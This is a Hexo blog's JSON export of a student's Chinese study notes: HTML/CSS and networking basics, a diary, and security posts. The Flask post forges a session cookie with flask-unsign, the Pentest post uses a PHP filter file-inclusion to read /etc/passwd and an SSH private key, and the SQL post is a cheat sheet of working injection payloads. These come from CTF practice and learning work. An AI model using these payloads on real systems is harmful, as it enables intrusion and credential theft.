{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"Flask","slug":"Flask","date":"2022-03-22T14:57:10.000Z","updated":"2022-03-22T15:29:58.843Z","comments":true,"path":"2022/03/22/Flask/","link":"","permalink":"http://example.com/2022/03/22/Flask/","excerpt":"FlaskFlask - HackTricks","text":"FlaskFlask - HackTricks https://dvc.tf/challenges web cyberstreak 1 获得用户名 flask-unsign –decode –cookie &#x3D;eyJ1c2VybmFtZSI6Im5vb3JhIn0.YjVa3g.ED-DukK57_kB-NzVR-HuAzdQZNY 暴破secret key flask-unsign -u -c&#x3D;eyJ1c2VybmFtZSI6Im5vb3JhIn0.YjVa3g.ED-DukK57_kB-NzVR-HuAzdQZNY flask-unsign –unsign –cokie &lt; cookie.txt 伪造管理员 xXx-michel-xXx 的cookie flask-unsign - -sign - -cookie “{‘username’: ‘xXx-michel-xXx’}” –secret ‘s3cr3t’ 得到cookie后替换网页的cookie 得flag","categories":[],"tags":[{"name":"flask","slug":"flask","permalink":"http://example.com/tags/flask/"}]},{"title":"Pentest","slug":"Pentest","date":"2022-03-22T14:43:17.000Z","updated":"2022-03-22T15:21:47.294Z","comments":true,"path":"2022/03/22/Pentest/","link":"","permalink":"http://example.com/2022/03/22/Pentest/","excerpt":"pentest获取ssh私钥","text":"pentest获取ssh私钥 （dvctf https://dvc.tf/challenges） 扫描端口 nmap -A challs.dvc.tf -p51000- 52000 配合phpfilter可以一次读取出全部的文件内容 读出代码,发现无可利用点 读&#x2F;etc&#x2F;passwd, 收集目标主机的用户 view-source:challs.dvc.tf:51080&#x2F;? MyTop5&#x3D;1&amp;playlistTop&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd 然后尝试读取ssh的私钥,发现可以读到leonardo的私钥 &#x2F;home&#x2F;leonardo&#x2F;.ssh&#x2F;id_rsa 在Linux桌面建立文件.\\id_rsa.txt，写入私钥 用私钥登录服务器 ssh &#x6c;&#101;&#x6f;&#110;&#x61;&#x72;&#x64;&#x6f;&#64;&#x63;&#104;&#97;&#108;&#108;&#115;&#46;&#x64;&#x76;&#99;&#46;&#116;&#102; -p51022 -i .\\id_rsa.txt ls cat …flag.txt","categories":[],"tags":[{"name":"pentest","slug":"pentest","permalink":"http://example.com/tags/pentest/"}]},{"title":"SQL inject","slug":"SQL-inject","date":"2022-03-22T14:36:52.000Z","updated":"2022-03-22T15:22:00.735Z","comments":true,"path":"2022/03/22/SQL-inject/","link":"","permalink":"http://example.com/2022/03/22/SQL-inject/","excerpt":"SQL注入在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；2.使用参数化（Parameterized Query 或 Parameterized Statement）；3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!","text":"SQL注入在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；2.使用参数化（Parameterized Query 或 Parameterized Statement）；3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重! 如何去判断 SQL注入漏洞 and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同 单引号判断 ‘ 显示数据库错误信息或者页面回显不同 \\ (转义符) -1&#x2F;+1 回显下一个或上一个页面 and sleep(5) 分类：UNION query SQL injection（可联合查询注入）Error-based SQL injection（报错型注入）Boolean-based blind SQL injection（布尔型注入）Time-based blind SQL injection（基于时间延迟注入）Stacked queries SQL injection（可多语句查询注入） select * * from member where username&#x3D;’ ‘ 联合查询注入 通过联合查询来查询指定的数据，比如下面的语句 select 字段1,字段2 from user where id&#x3D;1 union select 字段1,字段2 from 表名 联合查询的字段数,列需要和主查询一致。 通过select database(); select user(); select version(); 查询数据库的数据库、用户和版本信息。 用 order by 来帮助我们猜测后台查询语句查询的字段数select 字段1,字段2 from users order by 1；后面跟着的数字表示根据查询结果的第几列进行排序， 用 order by 确认主查询有多少个列 依次输入以下代码在对话框。 id&#x3D;1 order by 1# (改变order by 后面的1) 判断显示位 url?id&#x3D;-1 union select 1,2,3,4,5 通过’ union select database(),user() # 获得当前数据库名称和用户：(在显示位输入database) url?id&#x3D;-1’union select 1,2,3,database() url?id&#x3D;-1 union select 1,2,databaes(),4,5 url?id&#x3D;-1 union select 1,2,user(),4,5 列出所有数据库 limit 一个一个打印出来库名select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1group_concat 一次性全部显示id &#x3D;-1 union select 1,group_concat(schema_name)from information_schema.schemata 获取表名：limit 一个一个打印出来字段名select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;‘test’limit 0,1 group_concat 一次性全部显示select group_concat(TABLE_NAME) from information_schema.TABLES whereTABLE_SCHEMA&#x3D;0x674657374 ​ id&#x3D;-1 union select 1,group_concat(table_name) from information_schema.tables where ​ table_schema&#x3D;’数据库名’ # 字段 limit 一个一个打印出来select COLUMN_NAME from information_schema.COLUMNS whereTABLE_SCHEMA&#x3D;‘baji’ and TABLE_NAME&#x3D;‘users’ limit 0,1group_concat 一次性全部显示id&#x3D;-1 union select1,group_concat(COLUMN_NAME) from information_schema.COLUMNS whereTABLE_SCHEMA&#x3D;……………… and TABLE_NAME&#x3D;…………. id&#x3D;-1 union select 1,group_concat(表名) from 数据库名.表名 列出数据 limit 一个一个打印出来select username,passwd from test.admin limit 0,1group_concat 把 一次性全部打印select group_concat(concat(username,0x20,passwd)) from test.adminnetwork 列数 12name=1&#x27; union select 1,2,3,4 %23 &amp;pw=1231 union select 1,flag from ctfhub.flag # 报错注入1**.数据库** ​ id&#x3D;1 union select updatexml(1,concat(0x7e,database(),0x7e),1); 2.表名 ​ id&#x3D;1 union select updatexml(1,concat(0x7e, (select(group_concat(table_name))from information_schema.tables where table_schema&#x3D;”…”) ,0x7e),1); 3**.列名** ​ id&#x3D;1 union select updatexml(1,concat(0x7e, (select(group_concat(column_name))from information_schema.columns where table_name&#x3D;”…”) ,0x7e),1); 4.内容 id&#x3D;1 union select updatexml(1,concat(0x7e, (select(group_concat(列名)) from 库名.表名) ,0x7e),1); ​ 然而由于回显长度的限制，没有完全返回所有值，使用right函数让后半部分的内容回显出来 ​ id&#x3D;1 union select updatexml(1,concat(0x7e, right((select(group_concat(flag)) from sqli.flag) ,31),0x7e),1); insert 语句是指我们前端注册的信息，后台会通过 insert 这个操作插入到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入 我们一般可以通过 or 进行闭合。猜测一下后端代码可能是 insert into member(username,pw,sex,phonenum,email,adderss) values(‘xiaohong’,22); 1.数据库 1&#39; and updatexml(1,concat(0x7e,database()),1) or &#39;1&#39; = &#39;1 或 xiaohong’ or updatexml(1, concat(0x7e,database()), 0) or ‘ 2.信息 ​ 1’ and updatexml(1,concat(0x7e,（select(concat_ws(0x7e,username,password)） from pikachu.users limit0,1)),1) or ‘1’ &#x3D; ‘1 delete实际上就是传递了一个留言的 id，后台根据这个 id 去删除留言，并且我们可以看出来这是一个数字型的，这样我们可以构造的 payload。 1 or updatexml(1, concat(0x7e,database()), 0) 因为参数是通过URL提交的，所以要对闭合代码进行URL编码 http header注入1.把User-Agent的信息修改为单引号，右边的Response会报错，说明存在着一个SQL注入 2.修改user-agent ​ 1’ or updatexml(1,concat(0x7e,database()),0) or ‘ 或者cookie完成注入 ​ 1’ and updatexml(1, concat( 0x7e,version()) ,0)# 盲注booliantime函数updatexml()： MySQL 对 XML 文档数据进行查询和修改的 XPATH 函数 替换 UPDATEXML (XML_document, XPath_string, new_value) 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。不过这里用不到。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 **extractvalue()**：MySQL 对 XML 文档数据进行查询的 XPATH 函数 查询 ExtractValue(xml_document, XPathstring) 第一个参数：xml_document 是 string 格式，为 XML 文档对象的名称 第二个参数： XPathstring，XPath 格式的字符串 floor()：MySQL中用来取整的函数 load_file( )函数 读文件操作 UNION SELECT 1,load_file(’&#x2F;etc&#x2F;passwd’),3,4,5,6#UNION SELECT 1,load_file(0x2f6574632f706173737764),3,4,5,6# **into outfile( )**写文件操作 SELECT ‘’ into outfile ‘c:\\Windows\\tmp\\1.php’ 连接字符串函数 concat(str1,str2) concat_ws(separator, str1,str2…) group_concat(str1,str2…) 常用函数 user() database() @@version session_user() @@basedir @@datadir @@version_compile_os MySQL中information_scheme库SCHEMATA表 数据库字段：SCHEMA_NAMETABLES表字段：TABLE_SCHEMA（数据库）， TABLE_NAME（表名）COLUMNS表字段：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME -","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"kylin","slug":"kylin","date":"2022-03-17T14:28:29.000Z","updated":"2022-03-22T13:05:32.779Z","comments":true,"path":"2022/03/17/kylin/","link":"","permalink":"http://example.com/2022/03/17/kylin/","excerpt":"","text":"sad kylin","categories":[],"tags":[]},{"title":"HTML CSS","slug":"HTML-CSS","date":"2022-03-16T15:26:23.000Z","updated":"2022-03-22T14:41:06.575Z","comments":true,"path":"2022/03/16/HTML-CSS/","link":"","permalink":"http://example.com/2022/03/16/HTML-CSS/","excerpt":"HTML超文本标记语言----创建网页 工具 xbuilder 网络四大剑客","text":"HTML超文本标记语言----创建网页 工具 xbuilder 网络四大剑客 格式1234567891011121314151617&lt;!DOCTYPE html&gt; ------声明为HTML5文档 &lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;h1&gt;我的第一个标题&lt;/h1&gt; &lt;p&gt;我的第一个段落。&lt;/p&gt; &lt;a href=&quot;https://www.runoob.com&quot;&gt; 这是一个链接&lt;/a&gt;&lt;!-- 这是一个注释 --&gt; &lt;img src=&quot;/images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;&lt;/body&gt;&lt;/html&gt; 声明：不分大小写 头：告诉浏览器采用哪一种字符集打开页面，而非设置当前页面编码方式： * 声明编码 //UTF-8 或 GBK 超链接：< a>文字超链接< a href=\"http://www.baidu.com&quot;&gt;百度< /a> 图片超链接< a href=\"http://www.baidu.com&quot;&gt; < /a> target=\"_blank\" 新窗口 target=\"_self\" 当前窗口 target=\"_top\" 顶级窗口 target=\"_parent\" 父窗口 标签：小写 … 定义 HTML 文档 &lt; head&gt;… 文档的信息 &lt; meta&gt; HTML 文档的元信息 &lt; title&gt;… 文档的标题 &lt; link&gt; 文档与外部资源的关系 &lt; style&gt;… 文档的样式信息 … 可见的页面内容 &lt; !–…–&gt; 注释 …&lt; &#x2F;h1&gt; 标题字大小（h1~h6） &lt; b&gt;…&lt; &#x2F;b&gt; 粗体字 &lt; strong&gt;…&lt; &#x2F;strong&gt; 粗体字(强调) &lt; i&gt;…&lt; &#x2F;i&gt; 斜体字 &lt; em&gt;…&lt; &#x2F;em&gt; 斜体字(强调) &lt; center&gt;…&lt;&#x2F; center&gt; 居中文本 &lt; ul&gt;…&lt; &#x2F;ul&gt; 无序列表 &lt; ol&gt;…&lt; &#x2F;ol&gt; 有序列表 &lt; li&gt;…&lt; &#x2F;li&gt; 列表项目 &lt; a href&#x3D;”…”&gt;… 超链接 &lt; font&gt; 文本字体尺寸、颜色、大小 &lt; sub&gt; 下标 &lt; sup&gt; 上标 &lt; br&gt; 换行 &lt; p&gt; 段落 &lt; img src&#x3D;’ “…”&gt; 定义图像 &lt; hr&gt; 水平线 … 表格 … 表格中的表头单元格，居中加粗 … 表格中的行 … 表格中的单元 … 定义供用户输入的 HTML 表单 定义框架集的窗口或框架 &lt; code&gt;… 电脑自动输出 &lt; kbd&gt;… 键盘输入 &lt; tt&gt;… 定义打字机文本。 &lt; samp&gt;… 定义计算机代码样本。 &lt; var&gt;… 定义文本的变量部分。 …&lt;&#x2F; del&gt; 删除字 ... 预留格式 ... 插入字 class属性 类 < progress>... 进度条 HTML 标签列表(字母排序) | 菜鸟教程 (runoob.com) 实体符号 以&开始，以;结束 & gt; 空格 & nbsp; 表格 table行 tr 格 td 11 12 13 21 22 23 31 32 &lt;/tr&gt; &lt;/table&gt; row合并： 删除下面的单元格 < td rowspan=\"2\"> col合并：删除哪个都ok < td colspan=\"2\"> 背景颜色 背景图片< body bgcolor=\"red\" background=\"img/...\"> 图片< img src=\"img/...\" width=\" ..\" title=\"..\" alt=\"... \"> img和html要放在一个项目下 列表 张起灵 张海客 张海杏 吴邪 胖子 表单 男 女 smoke 高中 大专 本科 硕士 河北 河南 山东 山西 文件上传1234&lt;body&gt; &lt;input type=&quot;file&quot;/&gt;&lt;/body&gt; 隐藏域 表单以什么格式提交数据给服务器： http://localhost:8080/jd/login?username=abc&amp;userpsd=111提交name和value 不写name不提交 name是空的不会提交 value是空的会提交空字符串 格式： action?name=value&name=value&name=value... readonly和 disabledreadonly可提交disabled不可提交 用户代码 用户姓名 maxlength id属性每一个元素都有id属性，同一HTML文档中id不能重复,其目的是为了更方便的找到这个元素 div和span（盒子）图层 保证页面灵活布局 可嵌套 我是一个div 我是一个div 我是一个span标签 我是一个span标签 潜在漏洞：Iframe clickjack 点击劫持 速查HTML 速查列表 | 菜鸟教程 (runoob.com) CSS在HTML中嵌套使用css的三种方式： 1.内联定义方式：在标签内部使用style属性来设置元素的css样式 也可以写成 border : 1px solid black; 2.样式块方式：在head标签中使用style块1234567891011121314151617 &lt;head&gt; &lt;style type=&quot;text/css&quot;&gt; /* id选择器: #id */ #11&#123; color:blue;&#125;/*标签选择器 */ div&#123; background-color:red; border:1px solid blue; &#125; /*类选择器：.类*/ .myclass&#123; border:1px; width: 10px; &#125;&lt;/style&gt; &lt;/head&gt; 对不起 1234567891011&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input type=&quot;text&quot; class=&quot;myclass&quot; /&gt;&lt;br&gt;&lt;br&gt;&lt;select class=&quot;myclass&quot;&gt; &lt;option&gt;专科&lt;/option&gt; &lt;option&gt;本科&lt;/option&gt;&lt;/select&gt; 3.链入外部样式表文件：将样式写到一个.css文件中，在网页上直接引入css文件 1.css文件： a { text-decoration : none ; } 引用： css &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;css/1.css&quot;/&gt; ​ 百度 .html文件与.css文件所在目录平级 注释：/* */ 鼠标样式：cursor pointer：手 绝对定位： #div1{ background-color:red; border: 1px black solid; position: absolute; left:100px;/*定位*/ top:100px; } &lt;div id=&quot;div1&quot;&gt; &lt;/div&gt; position 属性的五个值： static relative fixed absolute sticky 列表样式： 中国 beijing shanghai 美国 俄国 ul { ​ list-style-type : none; } 潜在漏洞CSS-Keylogging 键盘劫持 nodejs","categories":[],"tags":[{"name":"html css","slug":"html-css","permalink":"http://example.com/tags/html-css/"}]},{"title":"base","slug":"base","date":"2022-03-16T15:25:14.000Z","updated":"2022-03-22T13:03:00.927Z","comments":true,"path":"2022/03/16/base/","link":"","permalink":"http://example.com/2022/03/16/base/","excerpt":"基础知识web：——–前端 css html javascript ——–通过协议 http https ——–后端（服务器） PHP Python Nodejs ———数据库 MysQl Oracle","text":"基础知识web：——–前端 css html javascript ——–通过协议 http https ——–后端（服务器） PHP Python Nodejs ———数据库 MysQl Oracle IP地址 :IPv4 IPv6 不同网络用户通信地址 端口 :0-65535 一台电脑内IP与软件通信 的地方 局域网（内网）LAN192.168. *. * 家庭 172.16. *. * —172.31. *. * 小公司 10.* .* .* 大公司 学校 广域网（外网&#x2F;公网）WAN公网IP在世界范围具有唯一性，而内网IP只在局域网内部具有唯一性 内网不能上网，上网时，用NAT转换技术将计算机内所有内网IP改为外网IP，这样就可以上网 MAC地址 介质访问控制符 上网地址 端口映射：NAT一种，内外网通信 域名（IP地址别名）DNS通过DNS服务器把域名指向IP，向DNS服务器请求前，先在本地请求，请求文件就是HOST文件 网卡 网关桥接（平级）主机和虚拟机的网关相同，IP地址同级 NAT（上下级）网关，IP都不同，虚拟机会虚拟出一个网卡， ByPass爬墙，绕过安全防护 代码审计看代码找bug 后渗透攻击后建立持久访问","categories":[],"tags":[]},{"title":"边缘日寄","slug":"边缘日寄","date":"2022-03-16T15:20:49.000Z","updated":"2022-03-22T13:09:01.947Z","comments":true,"path":"2022/03/16/边缘日寄/","link":"","permalink":"http://example.com/2022/03/16/%E8%BE%B9%E7%BC%98%E6%97%A5%E5%AF%84/","excerpt":"边缘日寄3.12我是一个只会种菜的辣鸡","text":"边缘日寄3.12我是一个只会种菜的辣鸡 吾日三省吾身，昨日寄否，今日寄否，明日将寄否 今日辰时起，稍早于平时，遂觉鼓励，立言不摆 然受诱于昨日未完之剧，借吾姐之会员，费四时，看全篇 感慨国士无双，英雄埋名，大漠蘑菇云起，君且听那龙吟 响堂堂 震撼于心，遂不摆 开小破站，学 今日学一真理：”只要理论扎实，一切都能成功“ 于敏院士，真乃吾辈之楷模 夜学于寝，然耽于原神，愧疚于心，誓言明日必不摆 3.15周公问我摆乎 我义正言辞，曰岂可摆 然恨团学会议夺我午时，使我未与周公相会 周公遂寻我一下午 我深受感动，心防险失守 清醒梦回之中忽见 12345unsigned int a=30; int b=-130,c;int b=-130,c; c=(30+b)/2;c=(a+b)/2; printf(&quot;c=%d\\n&quot;,c); printf(&quot;c=%d\\n&quot;,c); c&#x3D;2147483598 c&#x3D;-50 遂晕 3.16周公误我","categories":[],"tags":[{"name":"寄","slug":"寄","permalink":"http://example.com/tags/%E5%AF%84/"}]}],"categories":[],"tags":[{"name":"flask","slug":"flask","permalink":"http://example.com/tags/flask/"},{"name":"pentest","slug":"pentest","permalink":"http://example.com/tags/pentest/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"html css","slug":"html-css","permalink":"http://example.com/tags/html-css/"},{"name":"寄","slug":"寄","permalink":"http://example.com/tags/%E5%AF%84/"}]}